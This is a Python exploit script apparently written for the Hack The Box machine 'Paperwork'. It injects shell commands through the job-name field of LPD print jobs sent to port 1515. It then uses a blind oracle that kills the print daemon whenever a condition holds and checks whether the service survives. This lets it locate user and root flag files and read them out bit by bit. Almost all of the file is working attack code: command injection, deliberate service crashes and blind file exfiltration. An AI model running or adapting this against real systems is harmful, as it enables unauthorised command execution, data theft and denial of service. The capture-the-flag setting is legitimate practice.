#!/usr/bin/env python3
"""Extract flag from Paperwork HTB using kill oracle with confirmed RCE."""
import socket, time, sys, select, re, os

T = '10.129.38.158'
CACHE_DIR = '/home/yaser/raphael-2.0/exfil'

def ensure_dir():
    os.makedirs(CACHE_DIR, exist_ok=True)

def lpd_send(job_name, timeout=8):
    """Send LPD job using confirmed-working protocol (header + content separate)."""
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((T, 1515))
        s.send(b'\x02archive_intake\n')
        time.sleep(0.15)
        ready = select.select([s], [], [], 1)
        if ready[0]: s.recv(1024)
        
        content = f'J{job_name}\n'.encode()
        s.send(b'\x02' + str(len(content)).encode() + b'\n')
        time.sleep(0.3)
        ready2 = select.select([s], [], [], 3)
        if ready2[0]: s.recv(1024)
        
        s.send(content)
        time.sleep(0.3)
        s.recv(4096)
    except:
        pass
    finally:
        s.close()

def alive():
    s = socket.socket(); s.settimeout(2)
    try:
        s.connect((T, 1515)); s.send(b'\x03'); d = s.recv(4096); s.close(); return True
    except: return False

def kill_if(condition):
    """Kill daemon if shell condition is true. Returns True if killed."""
    lpd_send(f"';{condition} && pkill -f server.py;echo '")
    time.sleep(0.15)
    a = alive()
    if not a:
        for _ in range(30):
            time.sleep(0.3)
            if alive(): break
        return True
    return False

def wait_ready():
    for _ in range(20):
        if alive(): return True
        time.sleep(0.5)
    return False

def shell_execute(cmd):
    """Execute a shell command via RCE."""
    lpd_send(f"';{cmd};echo '")

def oracle_extract_char(pos, charset, flag_path):
    """Extract a single character at position pos using the kill oracle."""
    for char in charset:
        if kill_if(f'c=$(cat {flag_path} 2>/dev/null);[ \"${{c:{pos}:1}}\" = \"{char}\" ]'):
            return char
    return None

def oracle_read_file_cached(file_path):
    """Read a file using the kill oracle character by character.
    Returns the content as a string.
    """
    # First get file size
    print(f"  Determining size of {file_path}...", flush=True)
    size = 0
    for i in range(1, 500):
        if kill_if(f'c=$(cat {file_path} 2>/dev/null);test -n \"${{c:{i}}}\"'):
            size = i
        else:
            break
        time.sleep(0.05)
    
    print(f"  File size: {size} characters", flush=True)
    
    if size == 0:
        return ""
    
    # Now extract each character
    # Optimize: binary search for each byte
    result = ""
    for pos in range(size):
        byte_val = 0
        for bit in range(7, -1, -1):
            test_val = byte_val | (1 << bit)
            if kill_if(f'c=$(cat {file_path} 2>/dev/null);bv=$(printf \"%d\" \"\'${{c:{pos}:1}}\");[ $bv -ge {test_val} ]'):
                byte_val = test_val
            time.sleep(0.05)
        
        # Convert byte to char
        result += chr(byte_val)
        sys.stdout.write(f"\r  [{pos+1}/{size}] '{result[-1]}' (byte={byte_val})")
        sys.stdout.flush()
        
        # Save progress
        if (pos + 1) % 10 == 0:
            with open(f'{CACHE_DIR}/partial_flag.txt', 'w') as f:
                f.write(result)
    
    print()
    return result

def oracle_extract_flag(flag_path):
    """Extract a flag using an optimized charset approach (faster for known format)."""
    # HTB flags: HTB{[0-9a-f]{32}} or similar
    # First determine the full flag length
    print(f"=== Determining flag length ({flag_path}) ===", flush=True)
    length = 0
    for i in range(1, 200):
        if kill_if(f'c=$(cat {flag_path} 2>/dev/null);test -n \"${{c:{i}}}\"'):
            length = i
        else:
            break
        time.sleep(0.05)
    
    print(f"Flag length: {length}", flush=True)
    
    if length == 0:
        print("ERROR: Flag not readable or empty!", flush=True)
        return None
    
    # Now extract each character
    # Use charset approach for the static parts, binary for the rest
    hex_chars = list('0123456789abcdef')
    full_charset = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()')
    
    flag = ""
    for pos in range(length):
        char = oracle_extract_char(pos, hex_chars, flag_path)
        if char is None:
            char = oracle_extract_char(pos, full_charset, flag_path)
        if char is None:
            # Try binary for this character
            byte_val = 0
            for bit in range(7, -1, -1):
                test_val = byte_val | (1 << bit)
                if kill_if(f'c=$(cat {flag_path} 2>/dev/null);bv=$(printf \"%d\" \"\'${{c:{pos}:1}}\");[ $bv -ge {test_val} ]'):
                    byte_val = test_val
                time.sleep(0.05)
            char = chr(byte_val)
        
        flag += char
        sys.stdout.write(f"\r  [{pos+1}/{length}] '{char}' -> {flag}")
        sys.stdout.flush()
        
        if char == '}':
            # Probably end of flag
            pass
    
    print(f"\n\n=== FLAG: {flag} ===", flush=True)
    return flag

def main():
    ensure_dir()
    
    # Step 1: Find the flag file
    print("=== Step 1: Find flag location ===", flush=True)
    
    # Check common locations
    flag_candidates = [
        '/home/*/user.txt',
        '/user.txt',
        '/flag.txt',
        '/flag',
        '/root/root.txt',
    ]
    
    flag_path = None
    for path in flag_candidates:
        if kill_if(f'test -f {path}'):
            print(f"  Found flag file at: {path}", flush=True)
            flag_path = path
            break
        time.sleep(0.1)
    
    if flag_path is None:
        # Enumerate /home/ for users
        print("  Searching /home/ ...", flush=True)
        for user in ['dave', 'paper', 'paperwork', 'lp', 'lpd', 'archivist', 'admin']:
            if kill_if(f'test -f /home/{user}/user.txt'):
                print(f"  Found flag at /home/{user}/user.txt!", flush=True)
                flag_path = f'/home/{user}/user.txt'
                break
            time.sleep(0.1)
    
    if flag_path is None:
        print("  Could not find flag. Checking if we can read /home/*/user.txt...", flush=True)
        if kill_if('cat /home/*/user.txt > /dev/null 2>&1'):
            print("  /home/*/user.txt is readable! Using wildcard path.", flush=True)
            flag_path = '/home/*/user.txt'
    
    if flag_path is None:
        print("CRITICAL: Could not find flag file", flush=True)
        return
    
    # Step 2: Extract the flag
    print(f"\n=== Step 2: Extract flag from {flag_path} ===", flush=True)
    flag = oracle_extract_flag(flag_path)
    
    if flag:
        # Save to file
        flag_file = f'{CACHE_DIR}/flag.txt'
        with open(flag_file, 'w') as f:
            f.write(flag)
        print(f"\nFlag saved to {flag_file}", flush=True)
        
        # Also check for additional flags
        for p in ['/root/root.txt', '/flag']:
            if p != flag_path and kill_if(f'test -f {p}'):
                print(f"\nFound additional flag at {p}!", flush=True)
                flag2 = oracle_extract_flag(p)
                if flag2:
                    with open(f'{CACHE_DIR}/flag2.txt', 'w') as f:
                        f.write(flag2)
                    print(f"Second flag saved to {CACHE_DIR}/flag2.txt", flush=True)

if __name__ == '__main__':
    main()
